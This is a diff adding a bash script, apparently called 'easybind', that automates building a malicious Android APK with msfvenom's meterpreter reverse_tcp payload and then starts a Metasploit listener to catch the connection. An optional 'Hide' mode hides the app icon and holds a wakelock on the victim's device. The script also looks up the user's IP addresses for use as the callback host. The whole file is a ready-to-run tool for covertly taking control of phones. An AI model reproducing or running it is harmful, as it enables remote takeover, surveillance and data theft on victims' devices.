@@ -1,0 +1,195 @@
+#!/bin/bash
+clear
+
+#get platform
+PLATFORM=$(python3 -c "import sys, os, platform;print('win' if sys.platform in ('win32', 'cygwin') else 'macosx' if sys.platform == 'darwin' else 'termux' if os.environ.get('PREFIX') != None else 'ish shell' if platform.release().endswith('ish') else 'linux' if sys.platform.startswith('linux') or sys.platform.startswith('freebsd') else 'unknown')")
+x=0
+# made by @BarBare0x
+
+function dependency() {
+	printf "  \e[0;32m[>]\e[0;37m Checking dependency .. \n\n"
+	sleep 1
+	deList=(
+		'msfvenom'
+		'msfconsole'
+		'python3'
+		'curl'
+	)
+	longest=$(echo "${deList[*]}" | sed 's/ /\n/g' | sort | uniq | awk '{print length, $0}' | sort -nr | head -n 1 | cut -d ' ' -f1)
+	len=$((1+$longest))
+	for pack in "${deList[@]}"; do
+		command -v $pack &> /dev/null
+		if ! [ "$?" = "0" ]; then
+			printf "  \e[0;31m[+]\e[0;37m ${pack^}"
+			for (( i=1 ; $i<=$(($len-${#pack})) ; i++ )); do
+				printf " "
+			done
+			printf "not installed \n"
+			x="1"
+		else
+			printf "  \e[0;33m[+]\e[0;37m ${pack^}"
+                        for (( i=1 ; $i<=$(($len-${#pack})) ; i++ )); do
+                                printf " "
+                        done
+                        printf "installed \n"
+		fi
+		sleep 0.5
+	done
+	if [ $x = 1 ]; then exit 2; fi
+}
+
+function banner0() {
+	printf "\e[${b};3${c}m${s}                         __    _           __ \e[0m\n"
+	printf "\e[${b};3${c}m${s}  ___  ____ ________  __/ /_  (_)___  ____/ / \e[0m\n"
+	printf "\e[${b};3${c}m${s} / _ \/ __ '/ ___/ / / / __ \/ / __ \/ __  /  \e[0m\n"
+	printf "\e[${b};3${c}m${s}/  __/ /_/ (__  ) /_/ / /_/ / / / / / /_/ /   \e[0m\n"
+	printf "\e[${b};3${c}m${s}\___/\__,_/____/\__, /_.___/_/_/ /_/\__,_/    \e[0m\n"
+	printf "\e[${b};37m   ${s}easy bind  \e[${b};3${c}m /____/\e[${b};37m  android payloads       \e[0m\n"
+	echo
+}
+
+function getIp() {
+	eip=$(curl -s ifconfig.io)
+	iip=$(ifconfig | grep inet | grep "192" | head -n1 | awk '{ printf $2 }')
+	lip="127.0.0.1"
+}
+
+function printIp() {
+	if ! [ -z "$eip" ]; then
+	        printf "  \e[0;32m[+]\e[0;37m external ip : \e[0;32m$eip\e[0m\n"
+	fi
+
+	if ! [ -z "$iip" ]; then
+	        printf "  \e[0;32m[+]\e[0;37m internal ip : \e[0;32m$iip\e[0m\n"
+	fi
+
+	printf "  \e[0;32m[+]\e[0;37m local    ip : \e[0;32m$lip\e[0m\n"
+	echo
+}
+
+function enterInfo() {
+
+	if [ -z "$iip" ]; then
+		defh="$lip"
+	else
+		defh="$iip"
+	fi
+	printf "  \e[2;30m[+] enter for choose default option \n"
+	printf "  \e[0;32m[+]\e[0;37m Host: \e[0;32m"
+	read lhost; printf "\e[0m"
+	if [ -z "$lhost" ]; then
+		lhost="$defh"
+		printf "\033[1A"
+		printf "  \e[0;32m[+]\e[0;37m Host: \e[0;32m$defh\r"
+		echo
+	fi
+	if ! [[ "$lhost" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
+		printf "\033[1A"
+		printf "  \e[0;32m[+]\e[0;37m Host: \e[0;32m$defh        \r"
+		echo
+	fi
+
+	defp="7262"
+	printf "  \e[0;32m[+]\e[0;37m Port: \e[0;32m"
+	read lport; printf "\e[0m"
+	if [ -z "$lport" ]; then
+		lport="$defp"
+		printf "\033[1A"
+		printf "  \e[0;32m[+]\e[0;37m Port: \e[0;32m$defp\r"
+		echo
+	fi
+
+	if [ "$lport" -lt "1024" ] || [ "$lport" -gt "9999" ]; then
+		lport="$defp"
+                printf "\033[1A"
+                printf "  \e[0;32m[+]\e[0;37m Port: \e[0;32m$defp\r"
+                echo
+	fi
+
+	if [ "$PLATFORM" = "termux" ]; then
+		defpa="/sdcard/payload$(date +%N).apk"
+	else
+		defpa="payload$(date +%N).apk"
+	fi
+
+	printf "  \e[0;32m[+]\e[0;37m Path: \e[0;32m"
+	read op; printf "\e[0m"
+	if [ -z "$op" ]; then
+		op="$defpa"
+		printf "\033[1A"
+		printf "  \e[0;32m[+]\e[0;37m Path: \e[0;32m$defpa\r"
+		echo
+	fi
+
+	printf "  \e[0;32m[+]\e[0;37m Hide: \e[0;32m"
+	read -n 3 hide; printf "\e[0m"
+
+	if [ -z "$hide" ]; then
+		hide="no"
+		printf "\033[1A"
+		printf "  \e[0;32m[+]\e[0;37m Hide: \e[0;32mNo \r"
+		echo
+	fi
+
+	hide="${hide,,}"
+	if ! [ "$hide" = "yes" ] || [ "$hide" = "no" ]; then
+		hide="no"
+		printf "\033[1A"
+                printf "  \e[0;32m[+]\e[0;37m Hide: \e[0;32mNo    \r"
+		echo
+	fi
+
+	echo
+	sleep 2
+	echo
+}
+
+function generatePayload() {
+	echo -e "  \e[0;32m[+]\e[0;37m Generating payload "
+	printf "  \e[0;32m[+]\e[0;37m Please wait... \r"
+	sleep 3
+
+	if [ "$hide" = "no" ]; then
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $op &> /dev/null
+	else
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -a dalvik --platform android R -o $op &> /dev/null
+	fi
+	printf "  \e[0;32m[+]\e[0;37m Payload generated... \n"
+	sleep 3
+}
+
+function listenPayload() {
+	b="1"
+	c="4"
+	s=""
+	clear
+	sleep 1
+	banner0
+	echo
+	printf "\e[1;34m[+]\e[1;37m Payload path: \e[1;34m$defpa\n"
+	printf "\e[1;34m[+]\e[1;37m Starting metasploit listener \e[1;34m... \n"
+	sleep 3
+	msfconsole -qx "use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit"
+}
+
+function end() {
+	clear
+	s="  "
+	banner0
+	printf "  \e[1;34m[+]\e[1;37m Exited .. \n"
+	exit 0
+}
+
+s="  "
+b="0"
+c="2"
+banner0
+dependency
+clear
+banner0
+getIp
+printIp
+enterInfo
+generatePayload
+listenPayload
+end
